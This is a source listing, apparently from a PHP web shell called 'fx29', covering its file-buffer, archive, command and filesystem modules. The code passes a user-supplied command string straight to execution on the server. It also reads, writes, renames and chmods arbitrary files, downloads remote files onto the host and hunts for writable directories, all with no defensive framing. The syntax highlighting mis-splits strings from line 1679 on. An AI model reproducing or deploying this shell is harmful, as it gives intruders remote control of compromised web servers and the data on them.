<span class="lineno">1609</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span>
<span class="lineno">1610</span>     <span class="p">}</span>
<span class="lineno">1611</span>     <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
<span class="lineno">1612</span>     <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="lineno">1613</span>   <span class="p">}</span>
<span class="lineno">1614</span>   <span class="c1">###[ EMPTY BUFFER ]###</span>
<span class="lineno">1615</span>   <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$actemptybuff</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1616</span>   <span class="c1">###[ PASTE BUFFER ]###</span>
<span class="lineno">1617</span>   <span class="k">elseif</span> <span class="p">(</span><span class="o">@</span><span class="nv">$actpastebuff</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1618</span>     <span class="nv">$psterr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">1619</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1620</span>       <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">1621</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs_copy_obj</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$to</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t copy &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&lt;br&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1622</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$copy_unset</span><span class="p">)</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span>
<span class="lineno">1623</span>     <span class="p">}</span>
<span class="lineno">1624</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1625</span>       <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">1626</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs_move_obj</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$to</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t move &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&lt;br&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1627</span>       <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span>
<span class="lineno">1628</span>     <span class="p">}</span>
<span class="lineno">1629</span>     <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
<span class="lineno">1630</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$psterr</span><span class="p">))</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Pasting with errors:&lt;br&gt;</span><span class="si">$psterr</span><span class="s2">&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1631</span>     <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="lineno">1632</span>   <span class="p">}</span>
<span class="lineno">1633</span>   <span class="c1">###[ ARCHIVE BUFFER ]###</span>
<span class="lineno">1634</span>   <span class="k">elseif</span> <span class="p">(</span><span class="o">@</span><span class="nv">$actarcbuff</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1635</span>     <span class="nv">$arcerr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">1636</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$actarcbuff_path</span><span class="p">,</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$ext</span> <span class="o">=</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1637</span>     <span class="k">else</span> <span class="p">{</span> <span class="nv">$ext</span> <span class="o">=</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1638</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$ext</span> <span class="o">==</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$cmdline</span> <span class="o">=</span> <span class="s2">&quot;tar cfzv&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1639</span>     <span class="nv">$cmdline</span> <span class="o">.=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$actarcbuff_path</span><span class="p">;</span>
<span class="lineno">1640</span>     <span class="nv">$objects</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">],</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
<span class="lineno">1641</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$objects</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1642</span>       <span class="nv">$v</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">1643</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="o">==</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$v</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1644</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1645</span>         <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno">1646</span>         <span class="nv">$v</span> <span class="o">.=</span> <span class="s2">&quot;*&quot;</span><span class="p">;</span>
<span class="lineno">1647</span>       <span class="p">}</span>
<span class="lineno">1648</span>       <span class="nv">$cmdline</span> <span class="o">.=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="p">;</span>
<span class="lineno">1649</span>     <span class="p">}</span>
<span class="lineno">1650</span>     <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
<span class="lineno">1651</span>     <span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">1652</span>     <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="nv">$cmdline</span><span class="p">);</span>
<span class="lineno">1653</span>     <span class="nb">chdir</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
<span class="lineno">1654</span>     <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$arcerr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t call archivator (&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nx">str2mini</span><span class="p">(</span><span class="nv">$cmdline</span><span class="p">,</span><span class="mi">60</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;)!&lt;br&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1655</span>     <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
<span class="lineno">1656</span>     <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
<span class="lineno">1657</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$copy_unset</span><span class="p">)</span> <span class="p">{</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span> <span class="p">}</span>
<span class="lineno">1658</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1659</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nx">fs_rmobj</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1660</span>       <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span>
<span class="lineno">1661</span>     <span class="p">}</span>
<span class="lineno">1662</span>     <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
<span class="lineno">1663</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$arcerr</span><span class="p">))</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Archivation errors:&lt;br&gt;</span><span class="si">$arcerr</span><span class="s2">&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1664</span>     <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="lineno">1665</span>   <span class="p">}</span>
<span class="lineno">1666</span>   <span class="c1">###[ CMD ]###</span>
<span class="lineno">1667</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;cmd&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1668</span>     <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$chdir</span><span class="p">);</span>
<span class="lineno">1669</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1670</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;div class=barheader&gt;.: Command Output :.&lt;/div&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1671</span>       <span class="nv">$olddir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
<span class="lineno">1672</span>       <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">1673</span>       <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
<span class="lineno">1674</span>       <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1675</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$cmd_txt</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1676</span>         <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
<span class="lineno">1677</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nv">$rows</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1678</span>         <span class="nv">$cols</span> <span class="o">=</span> <span class="mi">125</span><span class="p">;</span>
<span class="lineno">1679</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;textarea class=</span><span class="se">\&quot;</span><span class="s2">shell</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="si">$cols\</span><span class="s2">&quot;</span> <span class="nx">rows</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$rows\</span><span class="s2">&quot;</span> <span class="nx">readonly</span><span class="o">&gt;</span><span class="s2">&quot;.htmlspecialchars(</span><span class="si">$ret</span><span class="s2">).&quot;</span><span class="o">&lt;/</span><span class="nx">textarea</span><span class="o">&gt;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="lineno">1680</span> <span class="s2">      }</span>
<span class="lineno">1681</span> <span class="s2">      else { echo </span><span class="si">$ret</span><span class="s2">.&quot;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;; }</span>
<span class="lineno">1682</span> <span class="s2">      @chdir(</span><span class="si">$olddir</span><span class="s2">);</span>
<span class="lineno">1683</span> <span class="s2">    }</span>
<span class="lineno">1684</span> <span class="s2">  }</span>
<span class="lineno">1685</span> <span class="s2">  ###[ PHP FILESYSTEM (By FaTaLisTiCz_Fx) ]###</span>
<span class="lineno">1686</span> <span class="s2">  if (</span><span class="si">$act</span><span class="s2"> == &quot;</span><span class="nx">phpfsys</span><span class="s2">&quot;) {</span>
<span class="lineno">1687</span> <span class="s2">    echo &quot;</span><span class="o">&lt;</span><span class="nx">div</span> <span class="nx">align</span><span class="o">=</span><span class="nx">left</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1688</span> <span class="s2">    </span><span class="si">$fsfunc</span><span class="s2"> = </span><span class="si">$phpfsysfunc</span><span class="s2">;</span>
<span class="lineno">1689</span> <span class="s2">    if (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nb">copy</span><span class="s2">&quot;) {</span>
<span class="lineno">1690</span> <span class="s2">      if (!copy(</span><span class="si">$arg1</span><span class="s2">, </span><span class="si">$arg2</span><span class="s2">)) { echo &quot;</span><span class="nx">Failed</span> <span class="nx">to</span> <span class="nb">copy</span> <span class="nv">$arg1</span><span class="o">...</span><span class="nx">\n</span><span class="s2">&quot;;}</span>
<span class="lineno">1691</span> <span class="s2">      else { echo &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Success</span><span class="o">!&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="nv">$arg1</span> <span class="nx">copied</span> <span class="nx">to</span> <span class="nv">$arg2\n</span><span class="s2">&quot;; }</span>
<span class="lineno">1692</span> <span class="s2">    }</span>
<span class="lineno">1693</span> <span class="s2">    elseif (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nb">rename</span><span class="s2">&quot;) {</span>
<span class="lineno">1694</span> <span class="s2">      if (!rename(</span><span class="si">$arg1</span><span class="s2">, </span><span class="si">$arg2</span><span class="s2">)) { echo &quot;</span><span class="nx">Failed</span> <span class="nx">to</span> <span class="nb">rename</span><span class="o">/</span><span class="nx">move</span> <span class="nv">$arg1</span><span class="o">!</span><span class="nx">\n</span><span class="s2">&quot;;}</span>
<span class="lineno">1695</span> <span class="s2">      else { echo &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Success</span><span class="o">!&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="nv">$arg1</span> <span class="nx">renamed</span><span class="o">/</span><span class="nx">moved</span> <span class="nx">to</span> <span class="nv">$arg2\n</span><span class="s2">&quot;; }</span>
<span class="lineno">1696</span> <span class="s2">    }</span>
<span class="lineno">1697</span> <span class="s2">    elseif (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nb">chmod</span><span class="s2">&quot;) {</span>
<span class="lineno">1698</span> <span class="s2">      if (!chmod(</span><span class="si">$arg1</span><span class="s2">,</span><span class="si">$arg2</span><span class="s2">)) { echo &quot;</span><span class="nx">Failed</span> <span class="nx">to</span> <span class="nb">chmod</span> <span class="nv">$arg1</span><span class="o">!</span><span class="nx">\n</span><span class="s2">&quot;;}</span>
<span class="lineno">1699</span> <span class="s2">      else { echo &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Perm</span> <span class="k">for</span> <span class="nv">$arg1</span> <span class="nx">changed</span> <span class="nx">to</span> <span class="nv">$arg2</span><span class="o">!&lt;/</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">\n</span><span class="s2">&quot;; }</span>
<span class="lineno">1700</span> <span class="s2">    }</span>
<span class="lineno">1701</span> <span class="s2">    elseif (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nx">read</span><span class="s2">&quot;) {</span>
<span class="lineno">1702</span> <span class="s2">      </span><span class="si">$darg</span><span class="s2"> = </span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg1</span><span class="s2">;</span>
<span class="lineno">1703</span> <span class="s2">      if (</span><span class="si">$hasil</span><span class="s2"> = @file_get_contents(</span><span class="si">$darg</span><span class="s2">)) {</span>
<span class="lineno">1704</span> <span class="s2">        echo &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Filename</span><span class="o">:&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="s2">&quot;.</span><span class="si">$darg</span><span class="s2">.&quot;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1705</span> <span class="s2">        echo &quot;</span><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">textarea</span> <span class="nx">cols</span><span class="o">=</span><span class="mi">125</span> <span class="nx">rows</span><span class="o">=</span><span class="mi">30</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1706</span> <span class="s2">        echo htmlentities(</span><span class="si">$hasil</span><span class="s2">);</span>
<span class="lineno">1707</span> <span class="s2">        echo &quot;</span><span class="o">&lt;/</span><span class="nx">textarea</span><span class="o">&gt;&lt;/</span><span class="nx">center</span><span class="o">&gt;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="lineno">1708</span> <span class="s2">      }</span>
<span class="lineno">1709</span> <span class="s2">      else { disp_error(&quot;</span><span class="nx">Couldn</span><span class="s1">&#39;t open $darg&quot;); }</span>
<span class="lineno">1710</span> <span class="s1">    }</span>
<span class="lineno">1711</span> <span class="s1">    elseif ($fsfunc==&quot;write&quot;) {</span>
<span class="lineno">1712</span> <span class="s1">      $darg = $d.$arg1;</span>
<span class="lineno">1713</span> <span class="s1">      if(@file_put_contents($darg,$arg2)) {</span>
<span class="lineno">1714</span> <span class="s1">        echo &quot;&lt;b&gt;Saved!&lt;/b&gt; &quot;.$darg;</span>
<span class="lineno">1715</span> <span class="s1">      }</span>
<span class="lineno">1716</span> <span class="s1">      else { disp_error(&quot;Can&#39;</span><span class="nx">t</span> <span class="nx">write</span> <span class="nx">to</span> <span class="nv">$darg</span><span class="o">!</span><span class="s2">&quot;); }</span>
<span class="lineno">1717</span> <span class="s2">    }</span>
<span class="lineno">1718</span> <span class="s2">    elseif (</span><span class="si">$fsfunc</span><span class="s2">==&quot;</span><span class="nx">downloadbin</span><span class="s2">&quot;) {</span>
<span class="lineno">1719</span> <span class="s2">      </span><span class="si">$handle</span><span class="s2"> = fopen(</span><span class="si">$arg1</span><span class="s2">, &quot;</span><span class="nx">rb</span><span class="s2">&quot;);</span>
<span class="lineno">1720</span> <span class="s2">      </span><span class="si">$contents</span><span class="s2"> = &#39;&#39;;</span>
<span class="lineno">1721</span> <span class="s2">      while (!feof(</span><span class="si">$handle</span><span class="s2">)) {</span>
<span class="lineno">1722</span> <span class="s2">        </span><span class="si">$contents</span><span class="s2"> .= fread(</span><span class="si">$handle</span><span class="s2">, 8192);</span>
<span class="lineno">1723</span> <span class="s2">      }</span>
<span class="lineno">1724</span> <span class="s2">      </span><span class="si">$r</span><span class="s2"> = @fopen(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">,&#39;w&#39;);</span>
<span class="lineno">1725</span> <span class="s2">      if (fwrite(</span><span class="si">$r</span><span class="s2">,</span><span class="si">$contents</span><span class="s2">)) { echo &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Success</span><span class="o">!&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="nv">$arg1</span> <span class="nx">saved</span> <span class="nx">to</span> <span class="s2">&quot;.</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">.&quot;</span> <span class="p">(</span><span class="s2">&quot;.view_size(filesize(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">)).&quot;</span><span class="p">)</span><span class="s2">&quot;; }</span>
<span class="lineno">1726</span> <span class="s2">      else { disp_error(&quot;</span><span class="nx">Can</span><span class="s1">&#39;t write to &quot;.$d.$arg2.&quot;!&quot;); }</span>
<span class="lineno">1727</span> <span class="s1">      fclose($r);</span>
<span class="lineno">1728</span> <span class="s1">      fclose($handle);</span>
<span class="lineno">1729</span> <span class="s1">    }</span>
<span class="lineno">1730</span> <span class="s1">    elseif ($fsfunc==&quot;download&quot;) {</span>
<span class="lineno">1731</span> <span class="s1">      $text = implode(&#39;&#39;, file($arg1));</span>
<span class="lineno">1732</span> <span class="s1">      if ($text) {</span>
<span class="lineno">1733</span> <span class="s1">        $r = @fopen($d.$arg2,&#39;</span><span class="nx">w</span><span class="s1">&#39;);</span>
<span class="lineno">1734</span> <span class="s1">        if (fwrite($r,$text)) { echo &quot;&lt;b&gt;Success!&lt;/b&gt; $arg1 saved to &quot;.$d.$arg2.&quot; (&quot;.view_size(filesize($d.$arg2)).&quot;)&quot;; }</span>
<span class="lineno">1735</span> <span class="s1">        else { disp_error(&quot;Can&#39;</span><span class="nx">t</span> <span class="nx">write</span> <span class="nx">to</span> <span class="s2">&quot;.</span><span class="si">$d</span><span class="s2">.</span><span class="si">$arg2</span><span class="s2">.&quot;</span><span class="o">!</span><span class="s2">&quot;); }</span>
<span class="lineno">1736</span> <span class="s2">        fclose(</span><span class="si">$r</span><span class="s2">);</span>
<span class="lineno">1737</span> <span class="s2">      }</span>
<span class="lineno">1738</span> <span class="s2">      else { disp_error(&quot;</span><span class="nx">Can</span><span class="s1">&#39;t download from $arg1!&quot;);}</span>
<span class="lineno">1739</span> <span class="s1">    }</span>
<span class="lineno">1740</span> <span class="s1">    elseif ($fsfunc==&#39;</span><span class="nb">mkdir</span><span class="s1">&#39;) {</span>
<span class="lineno">1741</span> <span class="s1">      $thedir = $d.$arg1;</span>
<span class="lineno">1742</span> <span class="s1">      if ($thedir != $d) {</span>
<span class="lineno">1743</span> <span class="s1">        if (file_exists($thedir)) { echo &quot;&lt;b&gt;Already exists:&lt;/b&gt; &quot;.htmlspecialchars($thedir); }</span>
<span class="lineno">1744</span> <span class="s1">        elseif (!mkdir($thedir)) { echo &quot;&lt;b&gt;Access denied:&lt;/b&gt; &quot;.htmlspecialchars($thedir); }</span>
<span class="lineno">1745</span> <span class="s1">        else { echo &quot;&lt;b&gt;Dir created:&lt;/b&gt; &quot;.htmlspecialchars($thedir);}</span>
<span class="lineno">1746</span> <span class="s1">      }</span>
<span class="lineno">1747</span> <span class="s1">      else { echo &quot;Can&#39;</span><span class="nx">t</span> <span class="nx">create</span> <span class="nb">current</span> <span class="nb">dir</span><span class="o">:&lt;</span><span class="nx">b</span><span class="o">&gt;</span> <span class="nv">$thedir</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span><span class="s2">&quot;; }</span>
<span class="lineno">1748</span> <span class="s2">    }</span>
<span class="lineno">1749</span> <span class="s2">    elseif (</span><span class="si">$fsfunc</span><span class="s2">==&#39;fwritabledir&#39;) {</span>
<span class="lineno">1750</span> <span class="s2">      function recurse_dir(</span><span class="si">$dir</span><span class="s2">,</span><span class="si">$max_dir</span><span class="s2">) {</span>
<span class="lineno">1751</span> <span class="s2">        global </span><span class="si">$dir_count</span><span class="s2">;</span>
<span class="lineno">1752</span> <span class="s2">        </span><span class="si">$dir_count</span><span class="s2">++;</span>
<span class="lineno">1753</span> <span class="s2">        if( </span><span class="si">$cdir</span><span class="s2"> = dir(</span><span class="si">$dir</span><span class="s2">) ) {</span>
<span class="lineno">1754</span> <span class="s2">          while( </span><span class="si">$entry</span><span class="s2"> = </span><span class="si">$cdir</span><span class="s2">-&gt; read() ) {</span>
<span class="lineno">1755</span> <span class="s2">            if( </span><span class="si">$entry</span><span class="s2"> != &#39;.&#39; &amp;&amp; </span><span class="si">$entry</span><span class="s2"> != &#39;..&#39; ) {</span>
<span class="lineno">1756</span> <span class="s2">              if(is_dir(</span><span class="si">$dir</span><span class="s2">.</span><span class="si">$entry</span><span class="s2">) &amp;&amp; is_writable(</span><span class="si">$dir</span><span class="s2">.</span><span class="si">$entry</span><span class="s2">) ) {</span>
<span class="lineno">1757</span> <span class="s2">               if (</span><span class="si">$dir_count</span><span class="s2"> &gt; </span><span class="si">$max_dir</span><span class="s2">) { return; }</span>
<span class="lineno">1758</span> <span class="s2">                echo &quot;</span><span class="p">[</span><span class="s2">&quot;.</span><span class="si">$dir_count</span><span class="s2">.&quot;</span><span class="p">]</span> <span class="s2">&quot;.</span><span class="si">$dir</span><span class="s2">.</span><span class="si">$entry</span><span class="s2">.&quot;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="lineno">1759</span> <span class="s2">                recurse_dir(</span><span class="si">$dir</span><span class="s2">.</span><span class="si">$entry</span><span class="s2">.DIRECTORY_SEPARATOR,</span><span class="si">$max_dir</span><span class="s2">);</span>
<span class="lineno">1760</span> <span class="s2">              }</span>
<span class="lineno">1761</span> <span class="s2">            }</span>
<span class="lineno">1762</span> <span class="s2">          }</span>
<span class="lineno">1763</span> <span class="s2">          </span><span class="si">$cdir-&gt;close</span><span class="s2">();</span>
